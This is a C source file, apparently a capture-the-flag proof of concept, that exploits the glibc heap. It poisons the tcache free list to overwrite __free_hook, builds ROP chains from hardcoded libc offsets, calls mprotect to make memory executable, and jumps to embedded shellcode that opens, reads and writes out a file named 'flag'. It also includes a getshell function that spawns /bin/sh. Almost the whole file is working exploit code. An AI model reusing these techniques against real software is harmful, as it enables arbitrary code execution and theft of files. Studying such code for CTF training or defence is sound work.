#include <stdio.h>
#include <stdlib.h>
#include <string.h>
void getshell()
{
  system("/bin/sh");
}
//    libc:0x7fd0795d7000
//    svcudp_reply
//    0x00007fbfdb845f2e <+14>:	mov    rbp,rdi
//    0x00007fbfdb845f31 <+17>:	push   rbx
//    0x00007fbfdb845f32 <+18>:	sub    rsp,0x18
//    0x00007fbfdb845f36 <+22>:	mov    rbx,QWORD PTR [rdi+0x48]
//    0x00007fbfdb845f3a <+26>:	mov    rax,QWORD PTR [rbx+0x18]
//    0x00007fbfdb845f3e <+30>:	lea    r12,[rbx+0x10]
//    0x00007fbfdb845f42 <+34>:	mov    DWORD PTR [rbx+0x10],0x0
//    0x00007fbfdb845f49 <+41>:	mov    rdi,r12
// => 0x00007fbfdb845f4c <+44>:	call   QWORD PTR [rax+0x28]

int main() {
  char* chunk1=malloc(0x100);
  char* chunk2=malloc(0x100);
  free(chunk1);
  free(chunk2);
  char* system_ptr=system;
  printf("system addr %p\n",system_ptr);
  char* free_hook=system_ptr+0x374c28;
  char* magic_gadget=system_ptr+0xdfd16-8;
  char* read=system_ptr+0xa3ef0;
  char* open=system_ptr+0xa3c60;
  char* write=system_ptr+0xa3f90;
  char* mprotect=system_ptr+0xad0f0;

  char* syscall_ret=system_ptr+0xe6069;
  char* pop_rdi_ret=system_ptr-0x2177e;
  char* pop_rsi_ret=system_ptr-0x20ea2;
  char* pop_rdx_ret=system_ptr-0x42686;
  char* jmp_shellcode=system_ptr-0xf419;
  printf("free_hook %p \n",free_hook);
  
  *(unsigned long long *)chunk2=(unsigned long long)(free_hook-8);
  
  chunk2=malloc(0x100);
  chunk1=malloc(0x100);
  *(unsigned long long *)(chunk1+8)=magic_gadget;
  printf("chunk1 %p \n",*(unsigned long long *)chunk1);
  char* padding=malloc(0x100);
  // *(unsigned long long *)rop=pop_rdi_ret;  //orw
  // *(unsigned long long *)(rop+8)=rop+0x70;
  // *(unsigned long long *)(rop+0x10)=pop_rsi_ret;   
  // *(unsigned long long *)(rop+0x18)=0;   
  // *(unsigned long long *)(rop+0x20)=open;  
  // *(unsigned long long *)(rop+0x28)=pop_rdi_ret;
  // *(unsigned long long *)(rop+0x30)=3;
  // *(unsigned long long *)(rop+0x38)=pop_rdx_ret;
  // *(unsigned long long *)(rop+0x40)=0x10;
  // *(unsigned long long *)(rop+0x48)=read;
  // *(unsigned long long *)(rop+0x50)=pop_rdi_ret;
  // *(unsigned long long *)(rop+0x58)=1;
  // *(unsigned long long *)(rop+0x60)=write;
  // strcpy(rop+0x70, "./flag");
   char* rop=malloc(0x100);
  *(unsigned long long *)rop=pop_rdi_ret;  //orw
  *(unsigned long long *)(rop+8)=(unsigned long long)rop&(unsigned long long)~0xfff;
  *(unsigned long long *)(rop+0x10)=pop_rsi_ret;   
  *(unsigned long long *)(rop+0x18)=0x1000;   
  *(unsigned long long *)(rop+0x20)=pop_rdx_ret;  
  *(unsigned long long *)(rop+0x28)=7;
  *(unsigned long long *)(rop+0x30)=mprotect;
  *(unsigned long long *)(rop+0x38)=pop_rdi_ret;
  char* shellcode =rop+0x50;
  strcpy(shellcode,"\xBA\x66\x6C\x61\x67\x52\x48\x89\xE7\x31\xF6\x6A\x02\x58\x0F\x05\x89\xC7\x48\x89\xE6\x31\xC0\x0F\x05\x83\xF7\x02\x89\xF8\x0F\x05");
  *(unsigned long long *)(rop+0x40)=shellcode;
  *(unsigned long long *)(rop+0x48)=jmp_shellcode;


  *(unsigned long long *)(padding+0x48)=padding+0x10;
  *(unsigned long long *)(padding+0x28)=padding+0x8;
  *(unsigned long long *)(padding+0x30)=system_ptr+0x47c7;
  *(unsigned long long *)(padding+0x8)=system_ptr-0x4084c;
  *(unsigned long long *)(padding+0x10)=rop;
  free(padding);
  
  return 0;
}